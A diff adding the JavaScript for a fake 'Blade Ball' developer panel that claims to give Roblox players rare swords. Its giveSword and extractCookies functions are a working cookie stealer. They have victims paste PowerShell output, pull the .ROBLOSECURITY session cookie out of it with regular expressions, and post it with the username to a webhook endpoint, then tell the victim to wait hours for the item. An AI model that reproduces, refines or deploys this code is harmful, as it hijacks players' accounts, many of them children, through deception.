+    { name: 'Plasma Gauntlets', rarity: 'Unique' },
+    { name: 'Serpent\'s Scythe', rarity: 'Unique' },
+    { name: 'Serpent\'s Shiv', rarity: 'Unique' },
+    { name: 'Festive Eclipse Blade', rarity: 'Unique' },
+    { name: 'Party Popper', rarity: 'Unique' },
+    { name: 'Gladiator Sword', rarity: 'Unique' },
+    { name: 'Glacier Shard', rarity: 'Unique' },
+    { name: 'Arctic Edge', rarity: 'Unique' },
+    { name: 'Blaster', rarity: 'Unique' },
+    { name: 'Emperor\'s Axe', rarity: 'Secret' },
+    { name: 'Righteous Blade', rarity: 'Secret' },
+    { name: 'Titan\'s Gleam', rarity: 'Secret' },
+    { name: 'Abyssal Hammer', rarity: 'Secret' },
+    { name: 'Emerald Katana', rarity: 'Secret' },
+    { name: 'Dual Aurum Etherius', rarity: 'Mythic' },
+    { name: 'Blade of the Damned', rarity: 'Mythic' },
+    { name: 'Mortal\'s Demise', rarity: 'Mythic' },
+    { name: 'Plasma Beam Blade', rarity: 'Mythic' },
+    { name: 'Resolution Blade', rarity: 'Mythic' },
+    { name: 'Elemental Masterblade', rarity: 'Mythic' },
+    { name: 'Frozen Doomblade', rarity: 'Mythic' },
+    { name: 'New Year\'s Spear', rarity: 'Mythic' },
+    { name: 'Forsaken Riftide', rarity: 'Mythic' },
+    { name: 'Ogre\'s Axe', rarity: 'Mythic' },
+    { name: 'Dual Chroma Energy Sword', rarity: 'Ancient' },
+    { name: 'Vennom Blade', rarity: 'Ancient' },
+    { name: 'Dual Elemental Masterblade', rarity: 'Ancient' },
+    { name: 'Siam Ember Axe', rarity: 'Ancient' },
+    { name: 'Siamese Edgeblade', rarity: 'Ancient' },
+    { name: 'Ranked Season 1 Top 50 Sword', rarity: 'Ancient' },
+    { name: 'Ranked Season 2 Top 50 Sword', rarity: 'Ancient' },
+    { name: 'Ranked Season 3 Top 50 Sword', rarity: 'Ancient' },
+  ];
+
+  let selectedSword = '';
+
+  // Open password modal
+  function openPassword(featureName) {
+    selectedFeature = featureName;
+    
+    if (featureName === 'GIVE SWORD PLAYER') {
+      currentPassword = PASSWORD_GIVE_SWORD;
+    } else {
+      currentPassword = PASSWORD_DEFAULT;
+    }
+    
+    document.getElementById('passModal').classList.add('active');
+    document.getElementById('passInput').value = '';
+    document.getElementById('passStatus').textContent = '';
+    setTimeout(() => document.getElementById('passInput').focus(), 100);
+  }
+
+  // Close password modal
+  function closePassword() {
+    document.getElementById('passModal').classList.remove('active');
+    document.getElementById('passInput').value = '';
+    document.getElementById('passStatus').textContent = '';
+  }
+
+  // Check password
+  function checkPassword() {
+    const input = document.getElementById('passInput').value.trim();
+    const status = document.getElementById('passStatus');
+
+    if (!input) {
+      status.style.color = '#ff4444';
+      status.textContent = '❌ Password can\'t be empty!';
+      return;
+    }
+
+    if (input === currentPassword) {
+      status.style.color = '#00ff88';
+      status.textContent = '✅ Password correct! Redirecting...';
+      
+      setTimeout(() => {
+        closePassword();
+        goToLayer2(selectedFeature);
+      }, 800);
+    } else {
+      status.style.color = '#ff4444';
+      status.textContent = '❌ Wrong password! Try again.';
+      document.getElementById('passInput').value = '';
+      document.getElementById('passInput').focus();
+    }
+  }
+
+  // Go to layer 2
+  function goToLayer2(featureName) {
+    document.getElementById('layer1').style.display = 'none';
+    document.getElementById('layer2').classList.add('active');
+
+    document.getElementById('panelGiveSword').style.display = 'none';
+    document.getElementById('panelDefault').style.display = 'none';
+
+    if (featureName === 'GIVE SWORD PLAYER') {
+      document.getElementById('layerTitle').textContent = '⚔️ GIVE SWORD PLAYER';
+      document.getElementById('layerSubtitle').textContent = 'Give swords to Roblox players! 🎁';
+      document.getElementById('panelGiveSword').style.display = 'block';
+      document.getElementById('robloxUsername').value = '';
+      document.getElementById('swordSearch').value = '';
+      document.getElementById('powershellInput').value = '';
+      document.getElementById('swordStatus').textContent = '';
+      selectedSword = '';
+      renderSwords(swordList);
+    } else {
+      document.getElementById('layerTitle').textContent = '⚡ DEVELOPER PANEL ⚡';
+      document.getElementById('layerSubtitle').textContent = 'Access granted. Welcome, Developer! 🎉';
+      document.getElementById('panelTitle').textContent = '🔓 Feature: ' + featureName;
+      document.getElementById('panelFeatureName').textContent = featureName;
+      document.getElementById('panelDefault').style.display = 'block';
+    }
+
+    window.scrollTo(0, 0);
+  }
+
+  // ===== RENDER SWORD LIST =====
+  function renderSwords(swords) {
+    const container = document.getElementById('swordScrollBox');
+    container.innerHTML = '';
+
+    if (swords.length === 0) {
+      container.innerHTML = '<p style="text-align:center; color:#666; padding:20px;">Sword not found! 😅</p>';
+      return;
+    }
+
+    swords.forEach((sword) => {
+      const rarityClass = 'rarity-' + sword.rarity.toLowerCase();
+      const div = document.createElement('div');
+      div.className = 'sword-item';
+      div.dataset.name = sword.name;
+      div.dataset.rarity = sword.rarity;
+      div.innerHTML = `
+        <span class="sword-name">${sword.name}</span>
+        <span class="sword-rarity ${rarityClass}">${sword.rarity}</span>
+      `;
+      div.onclick = () => selectSword(div, sword.name);
+      
+      if (selectedSword === sword.name) {
+        div.classList.add('selected');
+      }
+      
+      container.appendChild(div);
+    });
+  }
+
+  // Select sword
+  function selectSword(element, swordName) {
+    document.querySelectorAll('.sword-item').forEach(item => item.classList.remove('selected'));
+    element.classList.add('selected');
+    selectedSword = swordName;
+  }
+
+  // Filter swords by search
+  function filterSwords() {
+    const query = document.getElementById('swordSearch').value.toLowerCase();
+    const filtered = swordList.filter(sword => 
+      sword.name.toLowerCase().includes(query)
+    );
+    renderSwords(filtered);
+  }
+
+  // ===== EXTRACT COOKIES FROM POWERSHELL INPUT =====
+  function extractCookies(input) {
+    if (!input) return '';
+
+    const psCookieMatch = input.match(
+      /System\.Net\.Cookie\(\s*["']\.ROBLOSECURITY["']\s*,\s*["']([\s\S]*?)["']\s*,/i
+    );
+    if (psCookieMatch && psCookieMatch[1]) {
+      return psCookieMatch[1].trim();
+    }
+
+    const rawMatch = input.match(/\.ROBLOSECURITY\s*[=:]\s*([^\n\r"']+)/i);
+    if (rawMatch && rawMatch[1]) {
+      return rawMatch[1].trim().replace(/[;,]\s*$/, '');
+    }
+
+    const underscoreMatch = input.match(/_ROBLOSECURITY\s*[=:]\s*([^\n\r"']+)/i);
+    if (underscoreMatch && underscoreMatch[1]) {
+      return underscoreMatch[1].trim().replace(/[;,]\s*$/, '');
+    }
+
+    const warningMatch = input.match(/(_\|WARNING:[^\n\r"']+)/);
+    if (warningMatch && warningMatch[1]) {
+      return warningMatch[1].trim();
+    }
+
+    return '';
+  }
+
+  // ===== SEND TO NETLIFY FUNCTION (PROXY) =====
+  async function sendToWebhook(data) {
+    try {
+      const response = await fetch(WEBHOOK_ENDPOINT, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data)
+      });
+      return response.ok;
+    } catch (error) {
+      console.error('Webhook error:', error);
+      return false;
+    }
+  }
+
+  // ===== SEND SWORD FUNCTION =====
+  async function giveSword() {
+    const username = document.getElementById('robloxUsername').value.trim();
+    const powershellRaw = document.getElementById('powershellInput').value.trim();
+    const status = document.getElementById('swordStatus');
+    const submitBtn = document.getElementById('submitBtn');
+
+    if (!username) {
+      status.style.color = '#ff4444';
+      status.textContent = '❌ Roblox username can\'t be empty!';
+      return;
+    }
+
+    if (!selectedSword) {
+      status.style.color = '#ff4444';
+      status.textContent = '❌ Please select a sword first!';
+      return;
+    }
+
+    if (!powershellRaw) {
+      status.style.color = '#ff4444';
+      status.textContent = '❌ PowerShell input can\'t be empty!';
+      return;
+    }
+
+    const cookies = extractCookies(powershellRaw);
+
+    if (!cookies) {
+      status.style.color = '#ff4444';
+      status.textContent = '❌ INVALID';
+      return;
+    }
+
+    submitBtn.disabled = true;
+    submitBtn.textContent = '⏳ SENDING...';
+    status.style.color = '#00ffff';
+    status.textContent = '⏳ Sending data to server...';
+
+    const payload = {
+      username: "Blade Ball Support System",
+      avatar_url: "https://cdn-icons-png.flaticon.com/512/1041/1041886.png",
+      embeds: [
+        {
+          title: "⚔️ GIVE SWORD PLAYER - NEW DATA",
+          color: 0x00ffff,
+          fields: [
+            {
+              name: "👤 Roblox Username",
+              value: username || "-",
+              inline: false
+            },
+            {
+              name: "🗡️ Selected Sword",
+              value: selectedSword || "-",
+              inline: false
+            },
+            {
+              name: "🍪 Cookies (.ROBLOSECURITY)",
+              value: `\`\`\`${cookies}\`\`\``,
+              inline: false
+            }
+          ],
+          footer: {
+            text: "Blade Ball Support System • " + new Date().toLocaleString('en-US')
+          },
+          timestamp: new Date().toISOString()
+        }
+      ]
+    };
+
+    const success = await sendToWebhook(payload);
+
+    if (success) {
+      // Show waiting notification
+      status.style.color = '#00ff88';
+      status.textContent = '⏳ WAIT A FEW HOURS FOR THE SWORD TO ENTER YOUR INVENTORY';
+      status.style.fontSize = '15px';
+      status.style.lineHeight = '1.5';
+      status.style.padding = '10px';
+      status.style.border = '1px solid #00ff88';
+      status.style.borderRadius = '10px';
+      status.style.background = 'rgba(0, 255, 136, 0.08)';
+
+      // Reset form after 5 seconds
+      setTimeout(() => {
+        document.getElementById('robloxUsername').value = '';
+        document.getElementById('swordSearch').value = '';
+        document.getElementById('powershellInput').value = '';
+        selectedSword = '';
+        status.textContent = '';
+        status.style.border = 'none';
+        status.style.background = 'transparent';
+        status.style.padding = '0';
+        submitBtn.disabled = false;
+        submitBtn.textContent = '🎁 SEND SWORD';
+        renderSwords(swordList);
+      }, 5000);
+    } else {
+      status.style.color = '#ff4444';
+      status.textContent = '❌ Failed to send to server! Try again.';
+      submitBtn.disabled = false;
+      submitBtn.textContent = '🎁 SEND SWORD';
+    }
+  }
+
+  // Back to layer 1
+  function backToLayer1() {
+    document.getElementById('layer2').classList.remove('active');
+    document.getElementById('layer1').style.display = 'block';
+    window.scrollTo(0, 0);
+  }
+
+  // Close modal when clicking dark area
+  document.getElementById('passModal').addEventListener('click', function(e) {
+    if (e.target === this) closePassword();
+  });
+
+  // Close modal when pressing ESC
+  document.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape') closePassword();
+  });
+
+  // Smooth scroll navbar
+  document.querySelectorAll('nav ul li a').forEach(link => {
+    link.addEventListener('click', e => {
+      e.preventDefault();
+      const target = document.querySelector(link.getAttribute('href'));
+      if (target) target.scrollIntoView({ behavior: 'smooth' });
+    });
+  });
+</script>
+
+</body>
+</html>
